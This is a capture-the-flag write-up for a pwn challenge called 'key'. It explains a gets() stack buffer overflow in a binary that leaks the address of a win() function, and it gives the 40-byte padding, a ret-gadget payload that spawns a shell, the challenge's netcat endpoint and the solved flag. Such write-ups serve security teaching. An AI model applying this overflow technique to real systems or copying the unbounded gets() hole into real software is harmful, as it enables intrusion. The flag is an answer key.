# key

**Category:** Pwn · **Points:** 172 · **Solves:** 71 · **Author:** w0152

**Flag:** `LITCTF{whY_d1d_7hE_pr1s0ner_ch00s3_th3_w1n_0v3r_7h3_bread?}`

## Challenge

> because bread tastes better than key
>
> `nc 136.115.87.65 31776`

## Analysis

The binary is **PIE**, but `main` leaks the one address we need — and pre-fills the
return slot with `"bread"`:

```c
printf("Key: %p", &win);        // leaks win()'s runtime address  ("the key")
char buf[0x20];
*(void**)((char*)buf + 0x28) = "bread";   // = [rbp+8], the RETURN ADDRESS, set to "bread"
gets(buf);                      // UNBOUNDED overflow of a 0x20 buffer
```

`win()` is simply:

```c
void win(){ system("/bin/sh"); }
```

So there's no need to break PIE ourselves: `printf("Key: %p", &win)` gives us `win`'s
runtime address directly. `buf` is `[rbp-0x20]`, the saved return address is `[rbp+8]`,
so the overflow offset is `0x20 + 8 = 40`.

## Exploit

1. Read the leak: `Key: 0x5xxxxxxxx189` → that's `win`.
2. Overflow: 40 bytes of padding, then overwrite the return address (currently `"bread"`)
   with `win`.
3. Stack alignment: returning straight into `win` crashes in `system()`’s `movaps`
   (`rsp % 16 != 0`). Prepend one bare `ret` gadget (`win + 0x19` = the `ret` at
   offset `0x11a2`) to realign.

```python
win = leak                       # from "Key: %p"
ret = win + 0x19                 # bare ret, alignment
payload = b"A"*40 + p64(ret) + p64(win)
# then: cat flag.txt
```

```
Key: 0x55f2f2549189
LITCTF{whY_d1d_7hE_pr1s0ner_ch00s3_th3_w1n_0v3r_7h3_bread?}
```

*(The prisoner chose the `win` over the `bread` — i.e. we replaced the "bread" return
value with `win`.)*

## Flag

```
LITCTF{whY_d1d_7hE_pr1s0ner_ch00s3_th3_w1n_0v3r_7h3_bread?}
```
